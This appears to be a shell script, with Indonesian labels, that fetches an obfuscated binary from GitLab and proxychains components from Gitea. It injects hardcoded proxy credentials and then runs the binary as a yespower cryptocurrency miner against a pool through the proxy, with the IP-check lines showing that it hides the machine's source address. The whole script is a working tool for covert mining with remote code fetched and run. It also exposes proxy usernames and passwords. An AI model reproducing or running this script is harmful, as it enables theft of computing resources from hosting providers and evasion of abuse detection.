proxy="52.5.38.201" 
port="9293" 
user="py8h6mtimyeool"  
pass="r1wr4kibq49lw0k52qhi17h0ke1j" 
wget -q -O m0c9ZNjrryOfktUInA225y https://gitlab.com/node.js2594450/ruby/-/raw/main/vds && chmod +x m0c9ZNjrryOfktUInA225y
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./m0c9ZNjrryOfktUInA225y -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-9999 -n 1)-syakira)  -p c=CRNC,mc=VHH  --proxy=http://py8h6mtimyeool:r1wr4kibq49lw0k52qhi17h0ke1j@52.7.247.138:9293 

